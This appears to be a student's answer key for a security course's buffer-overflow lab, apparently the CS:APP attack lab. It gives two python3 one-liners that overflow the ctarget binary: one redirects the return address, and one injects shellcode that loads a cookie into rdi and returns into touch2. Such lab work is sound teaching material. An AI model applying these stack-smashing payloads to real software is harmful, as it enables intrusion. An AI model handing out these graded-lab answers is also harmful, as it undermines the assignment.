# Solutions

## phase 1

python3 -c 'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xc0\x17\x40")' | ./ctarget -q

## phase 2

info: move cookie to rdi, push address of touch2 onto stack (this updates the stack pointer also), call retq (which pops return address from stack which points.

python3 -c 'import sys; sys.stdout.buffer.write( b"\xbf\xfa\x97\xb9\x59" + b"\x68\xec\x17\x40\x00" + b"\xc3" + b"\x00"*29 + b"\x78\xdc\x61\x55" + b"\x00"*4)' | ./ctarget -q
